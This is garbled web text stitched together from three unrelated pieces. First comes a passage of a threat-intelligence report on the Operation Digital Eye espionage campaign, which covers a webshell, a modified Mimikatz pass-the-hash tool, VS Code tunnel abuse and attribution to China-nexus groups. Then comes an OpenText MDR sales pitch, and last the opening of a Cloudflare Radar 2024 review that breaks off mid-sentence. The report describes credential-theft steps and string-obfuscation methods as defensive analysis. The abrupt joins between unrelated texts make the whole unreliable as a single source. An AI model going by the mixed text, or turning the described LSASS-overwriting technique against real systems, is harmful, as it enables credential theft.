&lt;li&gt;&lt;code&gt;验证和清理用户输入&lt;/code&gt;, which translates to &lt;code&gt;Validating and sanitizing user input&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;figure class="wp-caption aligncenter" id="attachment_109548" style="width: 671px;"&gt;&lt;img alt="PHPsert code snippets with comments in Chinese" class="size-full wp-image-109548" height="45" src="https://www.sentinelone.com/wp-content/uploads/2024/11/Op_Digital_Eye11.jpg" width="671" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109548"&gt;PHPsert code snippets with comments in Chinese&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;The presence of these comments, along with the indicators of removed code across PHPsert variants, suggests the potential involvement of Chinese-speaking developers who may have been simplifying the webshell&amp;#8217;s execution logic.&lt;/p&gt;
&lt;h2&gt;Pass-the-Hash Capability&lt;/h2&gt;
&lt;p&gt;The &lt;code&gt;bK2o.exe&lt;/code&gt; executable (a custom modified version of Mimikatz used in Operation Digital Eye for pass-the-hash attacks) enables the execution of processes within a user&amp;#8217;s security context by leveraging a compromised NTLM password hash, bypassing the need for the user’s actual password. To achieve this, &lt;code&gt;bK2o.exe&lt;/code&gt; overwrites memory of the LSASS process. The tool supports the following command-line parameters:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/c&lt;/code&gt;: The process to execute; defaults to &lt;code&gt;cmd.exe&lt;/code&gt; if not provided.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/u&lt;/code&gt;: The user’s username.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/d&lt;/code&gt;: The user’s domain.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/h&lt;/code&gt;: The NTLM password hash.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;bK2o.exe&lt;/code&gt; implements a pass-the-hash technique by overwriting LSASS memory in a manner similar to Mimikatz, with its implementation partially overlapping with Mimikatz functions such as &lt;code&gt;kuhl_m_sekurlsa_pth_luid&lt;/code&gt; and &lt;code&gt;kuhl_m_sekurlsa_msv_enum_cred_callback_pth&lt;/code&gt;. In summary, &lt;code&gt;bK2o.exe&lt;/code&gt; performs the following:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithlogonw" rel="noopener noreferrer" target="_blank"&gt;Creates&lt;/a&gt; a suspended process in a new logon session, specifying the attacker-provided process, username, domain, and an empty password.&lt;/li&gt;
&lt;li&gt;Based on the session’s locally unique identifier (LUID), locates and extracts from the LSASS process memory an encrypted credential data blob containing the user’s NTLM hash and the encryption keys required to decrypt the blob.&lt;/li&gt;
&lt;li&gt;Decrypts the data blob, overwrites the user’s NTLM hash with the attacker-provided hash, and re-encrypts the data blob.&lt;/li&gt;
&lt;li&gt;Resumes the suspended process.&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109535" style="width: 749px;"&gt;&lt;img alt="bK2o.exe creates a new process and retrieves the logon session’s LUID" class="size-full wp-image-109535" height="527" src="https://www.sentinelone.com/wp-content/uploads/2024/11/Op_Digital_Eye8.jpg" width="749" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109535"&gt;bK2o.exe creates a new process and retrieves the logon session’s LUID&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;To navigate LSASS memory, &lt;code&gt;bK2o.exe&lt;/code&gt; uses code signatures, represented as byte sequences in hexadecimal format. These sequences correspond to known LSASS instructions, which serve as navigation points within the memory.&lt;/p&gt;
&lt;p&gt;To hinder static analysis and evade detection, &lt;code&gt;bK2o.exe&lt;/code&gt; obfuscates code signatures and strings by constructing them dynamically on the stack at runtime, instead of storing them as static data.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109542" style="width: 382px;"&gt;&lt;img alt="bK2o.exe constructs the string lsasrv.dll on the stack" class="size-full wp-image-109542" height="181" src="https://www.sentinelone.com/wp-content/uploads/2024/11/Op_Digital_Eye17.jpg" width="382" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109542"&gt;bK2o.exe constructs the string lsasrv.dll on the stack&lt;/figcaption&gt;&lt;/figure&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109538" style="width: 314px;"&gt;&lt;img alt="bK2o.exe constructs the code signature 33 ff 41 89 37 4c 8b f3 [...] on the stack" class="size-full wp-image-109538" height="121" src="https://www.sentinelone.com/wp-content/uploads/2024/11/Op_Digital_Eye5.jpg" width="314" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109538"&gt;bK2o.exe constructs the code signature 33 ff 41 89 37 4c 8b f3 [&amp;#8230;] on the stack&lt;/figcaption&gt;&lt;/figure&gt;
&lt;h2&gt;From Operation Digital Eye to Tainted Love and Soft Cell&lt;/h2&gt;
&lt;p&gt;We identified two additional samples uploaded to malware sharing platforms that construct code signatures on the stack, which we refer to as &lt;code&gt;&lt;code&gt;wsx1.exe&lt;/code&gt;&lt;/code&gt; and &lt;code&gt;wsx1.exe&lt;/code&gt;. Like &lt;code&gt;bK2o.exe&lt;/code&gt;, both &lt;code&gt;wsx.exe&lt;/code&gt; and &lt;code&gt;wsx1.exe&lt;/code&gt; are custom modified versions of Mimikatz and implement pass-the-hash functionality.&lt;/p&gt;
&lt;p&gt;Substantial code segments in &lt;code&gt;wsx.exe&lt;/code&gt; and &lt;code&gt;wsx1.exe&lt;/code&gt;, which implement the construction of code signatures on the stack, overlap with those in &lt;code&gt;bK2o.exe&lt;/code&gt;, including identical &lt;code&gt;mov&lt;/code&gt; instruction operand sizes and values. This suggests that &lt;code&gt;wsx.exe&lt;/code&gt;, &lt;code&gt;wsx1.exe&lt;/code&gt;, and &lt;code&gt;bK2o.exe&lt;/code&gt; are highly likely derived from the same source.&lt;/p&gt;
&lt;p&gt;&lt;figure class="wp-caption aligncenter" id="attachment_109549" style="width: 442px;"&gt;&lt;img alt="Code segment in bK2o.exe" class="size-full wp-image-109549" height="542" src="https://www.sentinelone.com/wp-content/uploads/2024/11/Op_Digital_Eye10.jpg" width="442" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109549"&gt;Code segment in bK2o.exe&lt;/figcaption&gt;&lt;/figure&gt;&lt;br /&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109550" style="width: 473px;"&gt;&lt;img alt="Code segment in wsx1.exe" class="size-full wp-image-109550" height="562" src="https://www.sentinelone.com/wp-content/uploads/2024/11/Op_Digital_Eye1.jpg" width="473" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109550"&gt;Code segment in wsx1.exe&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;In turn, we observed overlaps between &lt;code&gt;wsx.exe&lt;/code&gt;, &lt;code&gt;wsx1.exe&lt;/code&gt;, and mim221 components. mim221 is a versioned and well-maintained credential theft tool, also a custom modified version of Mimikatz, which SentinelLabs observed in &lt;a href="https://www.sentinelone.com/labs/operation-tainted-love-chinese-apts-target-telcos-in-new-attacks/" rel="noopener noreferrer" target="_blank"&gt;Operation Tainted Love&lt;/a&gt; — a campaign targeting telecommunication providers in the Middle East in 2023.&lt;/p&gt;
&lt;p&gt;We attributed Operation Tainted Love to a suspected Chinese cyberespionage group within the nexus of Granite Typhoon (formerly known as Gallium) and APT41, while acknowledging the possibility of tool sharing among Chinese state-sponsored threat actors and the potential involvement of a shared vendor or digital quartermaster. We assess that mim221 represents an evolution of tooling &lt;a href="https://www.cybereason.com/blog/research/deadringer-exposing-chinese-threat-actors-targeting-major-telcos" rel="noopener noreferrer" target="_blank"&gt;associated&lt;/a&gt; with &lt;a href="https://www.cybereason.com/blog/research/operation-soft-cell-a-worldwide-campaign-against-telecommunications-providers" rel="noopener noreferrer" target="_blank"&gt;Operation Soft Cell&lt;/a&gt;, such as &lt;a href="https://www.virustotal.com/gui/file/65ea5f7750f44d98f1077397b906b2611781579a2ae6def44a4de5b41265a9b9/details" rel="noopener noreferrer" target="_blank"&gt;simplify_32.exe&lt;/a&gt;. Operation Soft Cell, which targeted telecommunication providers in 2017 and 2018, has been &lt;a href="https://www.bleepingcomputer.com/news/security/microsoft-warns-of-gallium-threat-group-attacking-global-telcos/" rel="noopener noreferrer" target="_blank"&gt;linked&lt;/a&gt; to Granite Typhoon, and possible &lt;a href="https://github.com/yt0ng/cracking_softcell/blob/main/Cracking_SOFTCLL_TLP_WHITE.pdf" rel="noopener noreferrer" target="_blank"&gt;connections&lt;/a&gt; between the Soft Cell actors and APT41 have also been suggested.&lt;/p&gt;
&lt;p&gt;mim221 has a multi-component architecture, with a single executable staging three components — &lt;code&gt;pc.dll&lt;/code&gt;, &lt;code&gt;AddSecurityPackage64.dll&lt;/code&gt;, and &lt;code&gt;getHashFlsa64.dll&lt;/code&gt; — using techniques such as decryption, injection, and reflective image loading. These components share several overlaps with &lt;code&gt;bK2o.exe&lt;/code&gt;, &lt;code&gt;wsx.exe&lt;/code&gt;, and &lt;code&gt;wsx1.exe&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;To hinder static analysis, some mim221 components also obfuscate strings by constructing them on the stack at runtime. Additionally, the mim221 components &lt;code&gt;AddSecurityPackage64.dll&lt;/code&gt; and &lt;code&gt;getHashFlsa64.dll&lt;/code&gt; implement error logging similar to that of &lt;code&gt;wsx.exe&lt;/code&gt; and &lt;code&gt;wsx1.exe&lt;/code&gt;, including identical custom error messages, a consistent output format, and the same English-language errors.&lt;/p&gt;
&lt;p&gt;&lt;figure class="wp-caption aligncenter" id="attachment_109534" style="width: 311px;"&gt;&lt;img alt="Error messages in mim221" class="size-full wp-image-109534" height="110" src="https://www.sentinelone.com/wp-content/uploads/2024/11/Op_Digital_Eye9.jpg" width="311" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109534"&gt;Error messages in mim221&lt;/figcaption&gt;&lt;/figure&gt;&lt;br /&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109544" style="width: 331px;"&gt;&lt;img alt="Error messages in wsx.exe and wsx1.exe" class="size-full wp-image-109544" height="109" src="https://www.sentinelone.com/wp-content/uploads/2024/11/Op_Digital_Eye15.jpg" width="331" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109544"&gt;Error messages in wsx.exe and wsx1.exe&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;In addition, RTTI (Run-Time Type Information) information stored in &lt;code&gt;wsx.exe&lt;/code&gt;, &lt;code&gt;wsx1.exe&lt;/code&gt;, and the mim221 component &lt;code&gt;getHashFlsa64.dll&lt;/code&gt; reveals that classes with the same names are declared across these executables. We have not observed these class names in open-source or publicly available tooling.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109537" style="width: 1999px;"&gt;&lt;img alt="Class names (those present in more than one executable are highlighted in bold)" class="size-full wp-image-109537" height="1621" src="https://www.sentinelone.com/wp-content/uploads/2024/11/Op_Digital_Eye6.jpg" width="1999" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109537"&gt;Class names (those present in more than one executable are highlighted in bold)&lt;/figcaption&gt;&lt;/figure&gt;
&lt;h2&gt;mimCN | A Collection of China-Nexus APT Tools&lt;/h2&gt;
&lt;p&gt;Due to the previously discussed overlaps between &lt;code&gt;bK2o.exe&lt;/code&gt; (used in Operation Digital Eye), &lt;code&gt;wsx.exe&lt;/code&gt;, &lt;code&gt;wsx1.exe&lt;/code&gt;, mim221 components (used in Operation Tainted Love), and &lt;code&gt;simplify_32.exe&lt;/code&gt; (used in Operation Soft Cell), we collectively refer to this collection of tools as mimCN.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109543" style="width: 1999px;"&gt;&lt;img alt="The mimCN samples bK2o.exe, wsx.exe, wsx1.exe, and mim221" class="size-full wp-image-109543" height="895" src="https://www.sentinelone.com/wp-content/uploads/2024/11/Op_Digital_Eye16.jpg" width="1999" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109543"&gt;The mimCN samples bK2o.exe, wsx.exe, wsx1.exe, and mim221&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;We include in the mimCN tool collection not only the previously mentioned tools but also any other custom modifications of Mimikatz that have overlaps with other mimCN executables, suggesting they may originate from the same source. Such overlaps include shared code-signing certificates and the use of unique custom error messages or obfuscation techniques.&lt;/p&gt;
&lt;p&gt;To date, we have observed mimCN tools exclusively in the context of suspected Chinese APT activities. Although the compilation timestamps of the mimCN samples observed in these intrusions could have been manipulated, the proximity of the timestamps to when the activities occurred suggests that they are likely authentic.&lt;/p&gt;

&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109547" style="width: 1999px;"&gt;&lt;img alt="Use of mimCN samples" class="size-full wp-image-109547" height="668" src="https://www.sentinelone.com/wp-content/uploads/2024/11/Op_Digital_Eye12.jpg" width="1999" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109547"&gt;Use of mimCN samples&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;Further, unique usage instructions found in some mimCN samples, such as &lt;code&gt;[ERROR]Please input command. eg, /cmd:xxx&lt;/code&gt;  and &lt;code&gt;[ERROR]Please input ip. eg, /ip:xx.XXX.xx.x or /ip:xxx.com&lt;/code&gt;, suggest the involvement of a dedicated development team that is leaving instructions for a separate group of operators. Combined with the presence of overlapping mimCN samples across various intrusions attributed to China-nexus APT groups and distributed over years, this suggests that mimCN is likely the product of an entity responsible for maintaining and provisioning tools to multiple clusters within the Chinese APT ecosystem.&lt;/p&gt;
&lt;h2&gt;Attribution Analysis&lt;/h2&gt;
&lt;p&gt;We assess that Operation Digital Eye was highly likely conducted by a China-nexus cluster with cyberespionage motivations. The specific group responsible remains unclear due to the extensive sharing of malware, operational playbooks, and infrastructure management processes among Chinese APT clusters. Our assessment is based on a collective consideration of multiple indicators, including the malware, infrastructure, and techniques used, victimology, and the timing of the activities.&lt;/p&gt;
&lt;h3&gt;Malware&lt;/h3&gt;
&lt;p&gt;A variant of the PHPsert webshell contains code comments in simplified Chinese. This suggests the potential involvement of Chinese-speaking developers. Further, the custom Mimikatz modification &lt;code&gt;bK2o.exe&lt;/code&gt; used in Operation Digital Eye is part of the mimCN collection and shares implementation overlaps with other custom Mimikatz modifications, suggesting a common origin. These tools have been observed exclusively in the context of suspected Chinese APT activities, such as &lt;a href="https://www.cybereason.com/blog/research/operation-soft-cell-a-worldwide-campaign-against-telecommunications-providers" rel="noopener noreferrer" target="_blank"&gt;Operation Soft Cell&lt;/a&gt; and &lt;a href="https://www.sentinelone.com/labs/operation-tainted-love-chinese-apts-target-telcos-in-new-attacks/" rel="noopener noreferrer" target="_blank"&gt;Operation Tainted Love&lt;/a&gt;. Malware and tooling used in these operations have been associated with the suspected Chinese APT groups Granite Typhoon and APT41, and &lt;a href="https://github.com/yt0ng/cracking_softcell/blob/main/Cracking_SOFTCLL_TLP_WHITE.pdf" rel="noopener noreferrer" target="_blank"&gt;possible connections&lt;/a&gt; to other China-nexus groups, such as APT10 and Lucky Mouse have also been suggested.&lt;/p&gt;
&lt;p&gt;The mimCN tool collection suggests the presence of a shared vendor or digital quartermaster responsible for the sustained development and provisioning of tools to groups within the Chinese APT ecosystem. This function is &lt;a href="https://go.recordedfuture.com/hubfs/reports/cta-2023-1107.pdf" rel="noopener noreferrer" target="_blank"&gt;suspected&lt;/a&gt; to play a significant role in the Chinese threat landscape. The &lt;a href="https://www.sentinelone.com/labs/unmasking-i-soon-the-leak-that-revealed-chinas-cyber-operations/" rel="noopener noreferrer" target="_blank"&gt;I-Soon leak&lt;/a&gt;, which offers rare insight into China’s cyberespionage activities, provides supporting evidence for the existence of digital quartermasters within this landscape.&lt;/p&gt;
&lt;h3&gt;Infrastructure&lt;/h3&gt;
&lt;p&gt;While not exclusive to Chinese APT groups, the use of M247 infrastructure, as seen in Operation Digital Eye, has been common among them in recent years. One example is the &lt;a href="https://www.sentinelone.com/labs/sandman-apt-china-based-adversaries-embrace-lua/" rel="noopener noreferrer" target="_blank"&gt;M247 infrastructure attributed&lt;/a&gt; to the suspected Chinese cluster STORM-0866 (also known as Red Dev 40), with which the &lt;a href="https://www.sentinelone.com/labs/sandman-apt-a-mystery-group-targeting-telcos-with-a-luajit-toolkit/" rel="noopener noreferrer" target="_blank"&gt;Sandman APT group&lt;/a&gt; is associated.&lt;/p&gt;
&lt;p&gt;Additionally, the use of Cloud services and resources located in geographic proximity to the targeted organizations in Operation Digital Eye suggests a carefully planned and targeted infrastructure management approach. In this context, we suspect the potential involvement of third-party entities tasked with administering and provisioning infrastructure, a practice that has become &lt;a href="https://cloud.google.com/blog/topics/threat-intelligence/china-nexus-espionage-orb-networks/" rel="noopener noreferrer" target="_blank"&gt;increasingly common&lt;/a&gt; in the Chinese APT ecosystem in recent years.&lt;/p&gt;
&lt;h3&gt;Abuse of Visual Studio Code&lt;/h3&gt;
&lt;p&gt;Our visibility into threat actor activities suggests that the abuse of Visual Studio Code tunneling for C2 purposes was relatively rare in the wild before Operation Digital Eye.&lt;/p&gt;
&lt;p&gt;Previous &lt;a href="https://venturebeat.com/security/crowdstrike-2024-report-exposes-north-koreas-covert-workforce-in-u-s-tech-firms/" rel="noopener noreferrer" target="_blank"&gt;research&lt;/a&gt; indicates that, starting in 2023, a suspected North Korean group has used Visual Studio Remote Tunnels to maintain persistence in compromised networks. Additionally, in October 2024, Cyble released a &lt;a href="https://cyble.com/blog/silent-intrusion-unraveling-the-sophisticated-attack-leveraging-vs-code-for-unauthorized-access/" rel="noopener noreferrer" target="_blank"&gt;report&lt;/a&gt; documenting unattributed activity in which threat actors distributed a &lt;a href="https://www.sentinelone.com/labs/who-needs-macros-threat-actors-pivot-to-abusing-explorer-and-other-lolbins-via-windows-shortcuts/" rel="noopener noreferrer" target="_blank"&gt;Windows Shortcut&lt;/a&gt; (LNK) file to deploy Visual Studio Code and activate its tunneling feature to establish remote access.&lt;/p&gt;
&lt;p&gt;As of this writing, the only publicly disclosed use of this technique around the time of Operation Digital Eye has been attributed to a suspected Chinese APT group. In September 2024, Unit 42 published a &lt;a href="https://unit42.paloaltonetworks.com/stately-taurus-abuses-vscode-southeast-asian-espionage/" rel="noopener noreferrer" target="_blank"&gt;report&lt;/a&gt; on a campaign targeting government entities in Southeast Asia, in which threat actors used Visual Studio Code as a backdoor. The campaign was attributed to Stately Taurus (also known as Mustang Panda). The exact timeline of the campaign is unclear, with mid-August 2024 being the only reference point explicitly mentioned in the Unit 42 report. Based on this, we suspect that Operation Digital Eye occurred prior to this activity.&lt;/p&gt;
&lt;p&gt;We did not observe any overlaps in TTPs between Operation Digital Eye and the activity reported by Unit 42, except for the abuse of Visual Studio Code. We recognize the possibility that distinct Chinese APT clusters may share operational playbooks that include leveraging Visual Studio Code for C2 purposes.&lt;/p&gt;
&lt;h3&gt;Temporal Analysis&lt;/h3&gt;
&lt;p&gt;Our analysis of timestamps marking the dates and times of operator activity in the targeted organizations showed that all activities occurred on workdays (Monday to Friday). Additionally, converting the timestamps from their original time zones, Coordinated Universal Time (UTC) and Central European Summer Time (CEST, UTC+2), to China Standard Time (CST, UTC+8) revealed that the operators were primarily active during typical working hours in China, mostly between 9 a.m. and 9 p.m. CST.&lt;/p&gt;
&lt;p&gt;This suggests a potentially state-sanctioned operation. The &amp;#8216;996&amp;#8217; work schedule (9 a.m. to 9 p.m. CST, six days a week) has been common in China’s technology sector, but it was &lt;a href="https://www.reuters.com/world/china/chinese-authorities-say-overtime-996-policy-is-illegal-2021-08-27/" rel="noopener noreferrer" target="_blank"&gt;ruled illegal&lt;/a&gt; by the Supreme People&amp;#8217;s Court in 2021. As a result, state employees are almost certainly restricted to weekday work, typically between 9 a.m. and 9 p.m., aligning closely with our observations from the timestamp analysis.&lt;/p&gt;
&lt;p&gt;The figure below shows the total number of connections established by the threat actors to Visual Studio Code tunnels throughout Operation Digital Eye, broken down by hour of the day. The data is presented in both the original time zone (CEST) and in China Standard Time (CST, CEST+6). We observed minimal to no activity between 10 p.m. and 9 a.m. CST, as well as between 11 a.m. and 1 p.m. CST, which aligns with the typical daily working hours in China, including the midday lunch break.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109536" style="width: 1999px;"&gt;&lt;img alt="Number of established connections to Visual Studio Code tunnels" class="size-full wp-image-109536" height="704" src="https://www.sentinelone.com/wp-content/uploads/2024/11/Op_Digital_Eye7.jpg" width="1999" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109536"&gt;Number of established connections to Visual Studio Code tunnels&lt;/figcaption&gt;&lt;/figure&gt;
&lt;h2&gt;Conclusions&lt;/h2&gt;
&lt;p&gt;Operation Digital Eye highlights the persistent threat posed by Chinese cyberespionage groups to European entities, with these threat actors continuing to focus on high-value targets. The campaign underscores the strategic nature of this threat, as breaching organizations that provide data, infrastructure, and cybersecurity solutions to other industries gives the attackers a foothold in the digital supply chain, enabling them to extend their reach to downstream entities.&lt;/p&gt;
&lt;p&gt;The abuse of Visual Studio Code Remote Tunnels in this campaign illustrates how Chinese APT groups often rely on practical, solution-oriented approaches to evade detection. By leveraging a trusted development tool and infrastructure, the threat actors aimed to disguise their malicious activities as legitimate. The exploitation of widely used technologies, which security teams may not scrutinize closely, presents a growing challenge for organizations. For defenders, this calls for a reevaluation of traditional security approaches and the implementation of robust detection mechanisms to identify such evasive techniques in real time.&lt;/p&gt;
&lt;p&gt;Lateral movement capabilities observed in Operation Digital Eye, linked to custom Mimikatz modifications used in previous campaigns, indicate the potential involvement of shared vendors or digital quartermasters and the important function they serve in the Chinese APT ecosystem. These centralized entities provide continuity and adaptability to cyberespionage operations, equipping threat actors with consistently updated tools and evolving tactics as they target new victims.&lt;/p&gt;

More than ever, small and medium businesses (SMBs) are looking to MSPs as trusted advisors to help safeguard them from today’s growing cyber threats. One of the services in high demand right now? Managed detection and response (MDR). When asked about their biggest growth drivers, MSPs cite addressing clients’ cybersecurity concerns and awareness as the top new-business drivers (54%).&lt;sup&gt;&lt;a href="https://www.datto.com/resources/dattos-global-state-of-the-msp-report-2024-infographic/" rel="noreferrer noopener" target="_blank"&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;



&lt;p&gt;For MSPs, adding MDR to your lineup can create new revenue streams while enhancing the value you bring to your clients. By offering OpenText MDR to your MSP clients, you gain access to skilled security experts and advanced technology infrastructure—without the complexity and cost of building it all in-house.&lt;/p&gt;



&lt;p&gt;Here’s why more MSPs are partnering with OpenText to power their MDR security services:&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;1. Seamless integration with your existing tools&lt;/h2&gt;



&lt;p&gt;One of the greatest advantages of choosing OpenText MDR is its compatibility with your existing tools. OpenText MDR easily integrates with over 500 third-party tools, using APIs so you can add MDR services to your offerings without disrupting your current technology stack.&lt;/p&gt;



&lt;p&gt;This flexibility also extends to popular professional services automation (PSA) tools, allowing for smooth incident ticketing and vulnerability management within your established workflows. With OpenText MDR, you can confidently grow your service portfolio while keeping your partner ecosystem intact.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;2. Grow your revenue with flexible, hassle-free licensing&lt;/h2&gt;



&lt;p&gt;With cybersecurity top of mind, MSPs are seeing a surge in demand for security services. OpenText MDR helps you capitalize on this opportunity with a subscription-based model designed to grow with you—risk-free.&lt;/p&gt;



&lt;p&gt;There are no long-term contracts, hidden fees, or minimums—just the freedom to scale your MDR services month-to-month, at your own pace, and based on your clients&amp;#8217; evolving needs. This flexibility lets you capture new revenue streams without overextending your resources.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;3. Enhancing EDR with SIEM and SOAR capabilities&lt;/h2&gt;



&lt;p&gt;Effective MDR requires more than simply monitoring a client’s endpoint detection and response (EDR) solution—it demands a comprehensive view of the entire attack surface. OpenText MDR delivers this by enhancing your client’s EDR with advanced SIEM and SOAR capabilities.&lt;/p&gt;



&lt;p&gt;The platform features real-time monitoring—integrated SIEM and SOAR capabilities—enabling rapid threat detection and automated response across your clients’ environments. This advanced approach safeguards your clients from evolving threats on all fronts—from endpoint to cloud.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;4. Automation combined with human expertise&lt;/h2&gt;



&lt;p&gt;OpenText MDR brings together the speed of automation and the skill of experienced security analysts. This blend ensures that threats are detected quickly, incidents are prioritized with care, and responses are expertly managed around the clock, every day of the year. You get the best of both worlds—cutting-edge technology and dedicated human oversight that augments your MSP team.&lt;/p&gt;



&lt;p&gt;With OpenText MDR, you can confidently offer clients a proactive, always-on defense against evolving threats—without the need to build up your own in-house security team.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;5. Rapid incident response and proactive threat hunting&lt;/h2&gt;



&lt;p&gt;A speedy response is crucial to stopping adversaries in their tracks before they gain a foothold. MSPs can count on OpenText’s rapid incident response support, complete with dedicated escalation paths for high-priority threats, ensuring swift action when it matters most. You have the flexibility to choose whether you want the OpenText MDR team to completely manage threat response, or opt for co-managed support, where your team takes the lead with OpenText offering expert backup and resources.&lt;/p&gt;



&lt;p&gt;OpenText MDR also delivers continuous, proactive threat hunting to identify and neutralize risks before they can affect client environments. This powerful combination of active threat hunting and fast response equips MSPs to provide clients with a robust, preemptive defense against emerging threats.&lt;/p&gt;

The &lt;a href="https://radar.cloudflare.com/year-in-review/2024"&gt;&lt;u&gt;Cloudflare Radar 2024 Year In Review&lt;/u&gt;&lt;/a&gt; microsite continues that tradition, featuring interactive charts, graphs, and maps you can use to explore and compare notable Internet trends observed throughout this past year.&lt;/p&gt;&lt;p&gt;Cloudflare’s &lt;a href="https://www.cloudflare.com/network"&gt;&lt;u&gt;network&lt;/u&gt;&lt;/a&gt; currently spans more than 330 cities in over 120 countries/regions, serving an average of over 63 million HTTP(S) requests per second for millions of Internet properties, in addition to handling over 42 million DNS requests per second on average. The resulting data generated by this usage, combined with data from other complementary Cloudflare tools, enables Radar to provide unique near-real time perspectives on the patterns and trends around security, traffic, performance, and usage that we observe across the Internet. &lt;/p&gt;&lt;p&gt;The 2024 Year In Review is organized into five sections: &lt;a href="https://radar.cloudflare.com/year-in-review/2024#traffic"&gt;&lt;u&gt;Traffic&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024#adoption-and-usage"&gt;&lt;u&gt;Adoption &amp;amp; Usage&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024#connectivity"&gt;&lt;u&gt;Connectivity&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024#security"&gt;&lt;u&gt;Security&lt;/u&gt;&lt;/a&gt;, and &lt;a href="https://radar.cloudflare.com/year-in-review/2024#email-security"&gt;&lt;u&gt;Email Security&lt;/u&gt;&lt;/a&gt; and covers the period from January 1 to December 1, 2024. We have incorporated several new metrics this year, including AI bot &amp;amp; crawler traffic, search engine and browser market share, connection tampering, and “most dangerous” top level domains (TLDs). To ensure consistency, we have kept underlying methodologies consistent with previous years’ calculations. Trends for 200 countries/regions are available on the microsite; smaller or less populated locations are excluded due to insufficient data. Some metrics are only shown worldwide, and are not displayed if a country/region is selected. &lt;/p&gt;&lt;p&gt;Below, we provide an overview of the content contained within the major Year In Review sections (Traffic, Adoption &amp;amp; Usage, Connectivity, Security, and Email Security), along with notable observations and key findings. In addition, we have also published a companion blog post that specifically explores trends seen across &lt;a href="https://blog.cloudflare.com/radar-2024-year-in-review-internet-services/"&gt;&lt;u&gt;Top Internet Services&lt;/u&gt;&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;The key findings and associated discussion within this post only provide a high-level perspective on the unique insights that can be found in the &lt;a href="https://radar.cloudflare.com/year-in-review/2024"&gt;&lt;u&gt;Year in Review microsite&lt;/u&gt;&lt;/a&gt;. Visit the microsite to explore the various datasets and metrics in more detail, including trends seen in your country/region, how these trends have changed as compared to 2023, and how they compare to other countries/regions of interest. Surveying the Internet from this vantage point provides insights that can inform decisions on everything from an organization’s security posture and IT priorities to product development and strategy. &lt;/p&gt;

            &lt;h3&gt;Global Internet traffic grew 17.2% in 2024.&lt;/h3&gt;

            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;An inflection point for Internet traffic arguably occurred thirty years ago. The World Wide Web went mainstream in 1994, thanks to the late 1993 &lt;a href="https://cybercultural.com/p/1993-mosaic-launches-and-the-web-is-set-free/"&gt;&lt;u&gt;release&lt;/u&gt;&lt;/a&gt; of the &lt;a href="https://www.ncsa.illinois.edu/research/project-highlights/ncsa-mosaic/"&gt;&lt;u&gt;NCSA Mosaic&lt;/u&gt;&lt;/a&gt; browser for multiple popular operating systems, which included support for embedded images. In turn, “heavier” (in contrast to text-based) Internet content became the norm, and coupled with the growth in consumption through popular online services and the emerging consumer ISP industry, &lt;a href="https://blogs.cisco.com/sp/the-history-and-future-of-internet-traffic"&gt;&lt;u&gt;Internet traffic began to rapidly increase&lt;/u&gt;&lt;/a&gt;, and that trend has continued to the present.&lt;/p&gt;&lt;p&gt;To determine the traffic trends over time for the Year in Review, we use the average daily traffic volume (excluding bot traffic) over the second full calendar week (January 8-15) of 2024 as our baseline. (The second calendar week is used to allow time for people to get back into their “normal” school and work routines after the winter holidays and New Year’s Day. The percent change shown in the traffic trends chart is calculated relative to the baseline value — it does not represent absolute traffic volume for a country/region. The trend line represents a seven-day trailing average, which is used to smooth the sharp changes seen with data at a daily granularity. To compare 2024’s traffic trends with 2023 data and/or other locations, click the “Compare” icon at the upper right of the graph.&lt;/p&gt;&lt;p&gt;Throughout the first half of 2024, &lt;a 